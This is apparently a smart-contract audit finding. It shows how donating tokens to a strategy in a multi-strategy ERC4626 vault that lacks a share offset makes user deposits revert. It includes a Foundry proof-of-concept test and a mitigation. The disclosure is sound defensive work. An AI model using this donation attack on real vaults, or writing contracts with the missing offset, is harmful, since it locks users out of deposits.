S-436
Attacker can DoS entire vault, preventing majority of users from completing deposits
peter
50
Sufficient
383d ago
Finding description and impact

Neither StrategyBase.sol nor any of the in-scope strategy implementations actually modify the ERC4626 functions necessary to implement the desired 9 share offset. As a result the offset remains at the default value of 0. While this (combined with 0 share mint revert) provides protection from inflation attacks, the protocol can still be exploited by DoS attacks, causing user deposits to revert. The DoS effect of the attack is further compounded by strategy allocations, i.e. the protocol is as weak as its lowest strategy allocation.

Example attack:

After vault/strategy initialization (1 strategy, 5% allocation (say)), attacker donates 5 tokens to Strategy 1
Subsequent depositors can't deposit anything below 100 tokens + 20 wei, now. As a 100 token + 20 wei deposit allocates 5 tokens + 1 wei, enough to mint 1 share and not lead to rounding down to 0 shares (which causes the ZeroAmount() revert that DoSs the system)
The attack donation can be arbitrarily high, and the degree of vulnerability of the protocol to this attack is defined by its lowest strategy allocation (e.g. 3 strategies where allocation is 10%, 10% and 1% respectively, would mean a 1000 token deposit will still revert if just 10 tokens are donated to the third strategy with 1% allocation)

The key formula regarding the attack is _convertToShares() within StrategyBase and its associated strategy contracts, which gives shares minted in strategy:

Proof of Concept

The following PoC demonstrates the unhappy path detailed above. The PoC creates a new test suite using the ExampleStrategyBaseImplementation strategy. Note the decimals(), _convertToShares() and _convertToAssets() functions need to be commented out in ExampleStrategyBaseImplementation, because ExampleStrategyBaseImplementation, unlike the in-scope strategy contracts, actually correctly accounts for the offset.

Create new file integrations.t.sol in /test/:

Copy the following code into /test/integrations.t.sol:

//SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {IERC20, IERC4626} from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {Clones} from "@openzeppelin/contracts/proxy/Clones.sol";
import {MockERC20} from "./utils/mocks/MockERC20.sol";
import {MockERC4626} from "./utils/mocks/MockERC4626.sol";
import {MockERC4626Queue} from "./utils/mocks/MockERC4626Queue.sol";
import {MockERC4626Protect} from "./utils/mocks/MockERC4626Protect.sol";
import {ConcreteMultiStrategyVault} from "../src/vault/ConcreteMultiStrategyVault.sol";
import {IMockStrategy} from "../src/interfaces/IMockStrategy.sol";
import {Strategy, VaultFees, Allocation, GraduatedFee} from "../src/interfaces/IConcreteMultiStrategyVault.sol";
import {IStrategy, ReturnedRewards} from "../src/interfaces/IStrategy.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {Errors} from "../src/interfaces/Errors.sol";
import {WithdrawalQueue} from "../src/queue/WithdrawalQueue.sol";
import {console} from "forge-std/console.sol";
import {StrategyBase, RewardToken} from "../src/strategies/StrategyBase.sol";
import {ExampleStrategyBaseImplementation} from "./utils/examples/ExampleStrategyBaseImplementation.sol";

contract Integrations is Test {
    using Math for uint256;

    MockERC20 asset;
    Strategy[] strategies;
    ConcreteMultiStrategyVault vault;

    GraduatedFee[] graduatedFees;
    GraduatedFee[] zeroFees;

    address strategyImplementation;
    address implementation;
    uint256 constant MAX_BASIS_POINTS = 10_000;     // 100%

    address feeRecipient = address(0x1111);
    address jimmy = address(0x2222);
    address hazel = address(0x3333);
    address admin = address(0x4444);

    MockERC20 reward1;
    RewardToken[] public rewardTokens;
    ExampleStrategyBaseImplementation strategy;

    // Deploying a ConcreteMultiStrategyVault with a single strategy
    function setUp() public {
        vm.label(feeRecipient, "feeRecipient");
        vm.label(jimmy, "jimmy");
        vm.label(hazel, "hazel");
        // Example performanceFee: [{0000, 500, 300}, {501, 2000, 1000}, {2001, 5000, 2000}, {5001, 10000, 5000}]

        graduatedFees.push(GraduatedFee({lowerBound: 0, upperBound: 500, fee: 300}));
        graduatedFees.push(GraduatedFee({lowerBound: 501, upperBound: 2000, fee: 1000}));
        graduatedFees.push(GraduatedFee({lowerBound: 2001, upperBound: 5000, fee: 2000}));
        graduatedFees.push(GraduatedFee({lowerBound: 5001, upperBound: 10000, fee: 5000}));

        zeroFees.push(GraduatedFee({lowerBound: 0, upperBound: 10000, fee: 0}));

        asset = new MockERC20("Mock Asset", "MA", 18);
        implementation = address(new ConcreteMultiStrategyVault());
        address vaultAddress = Clones.clone(implementation);

        vault = ConcreteMultiStrategyVault(vaultAddress);

        reward1 = new MockERC20("Reward1", "R1", 18);
        rewardTokens.push(RewardToken({token: reward1, fee: 1000, accumulatedFeeAccounted: 0}));

        strategy = new ExampleStrategyBaseImplementation(       // Strategy 1
            asset,
            "StrategyBase",
            "SBA",
            feeRecipient,
            type(uint256).max,
            admin,
            rewardTokens,
            admin
        );

        strategies.push(Strategy({
                strategy: strategy,
                allocation: Allocation({index: 0, amount: 500})     // 5% allocation
        }));

        vault.initialize(
            IERC20(address(asset)),
            "Mock Vault",
            "MV",
            strategies,         // Initizing vault with a single strategy at 5% allocation
            feeRecipient,                                                   
            VaultFees({depositFee: 0, withdrawalFee: 0, protocolFee: 300, performanceFee: graduatedFees}),
            type(uint256).max,
            admin
        );
    }

    function test_DepositRevertAttack() external {
        console.log("Base asset decimals: ", asset.decimals());
        console.log("Multistrategy vault decimals: ", vault.decimals());
        console.log("Strategy decimals: ", strategy.decimals());

        uint256 jimmyDonation = 5 ether;
        uint256 hazelDeposit = 100 ether;

        // Minting assets to users
        console.log("Minting assets to users");
        asset.mint(jimmy, jimmyDonation);
        asset.mint(hazel, hazelDeposit);
        console.log("Jimmy balance: ", asset.balanceOf(jimmy));
        console.log("Hazel balance: ", asset.balanceOf(hazel));

        // Jimmy donates 5 tokens to the vault
        console.log("Jimmy donates 5 tokens to the vault");
        vm.prank(jimmy);
        asset.transfer(address(strategy), jimmyDonation);

        // Hazel deposits 100 tokens to the vault
        console.log("Hazel deposits 100 tokens to the vault");
        vm.startPrank(hazel);
        asset.approve(address(vault), hazelDeposit);
        // Asserting Hazel's deposit reverts due to zero amount of shares minted
        console.log("Asserting Hazel's deposit reverts due to zero amount of shares minted");
        vm.expectRevert(Errors.ZeroAmount.selector);
        vault.deposit(hazelDeposit, hazel);
        vm.stopPrank();
    }
}

Recommended mitigation steps

Modify decimals(), _convertToShares() and _convertToAssets() functions in StrategyBase, similar to how it is implemented in ExampleStrategyBaseImplementation.
